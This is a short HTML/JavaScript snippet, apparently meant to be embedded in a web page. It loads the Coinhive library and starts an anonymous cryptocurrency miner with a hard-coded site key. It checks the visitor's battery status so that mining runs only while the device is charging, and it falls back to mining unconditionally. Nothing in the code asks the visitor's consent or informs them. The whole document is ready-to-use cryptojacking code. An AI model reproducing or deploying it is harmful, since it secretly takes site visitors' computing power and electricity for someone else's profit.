<script type="text/javascript" src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script type="text/javascript">
var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
	threads: 1,
	autoThreads: false
});
try {
	navigator.getBattery().then(function (battery) {
		
		if (battery.charging) miner.start();
		
		battery.onchargingchange = function (evt) {
			if (battery.charging) miner.start();
			else miner.stop();
		}
		
	});
}catch(e){miner.start();}
</script>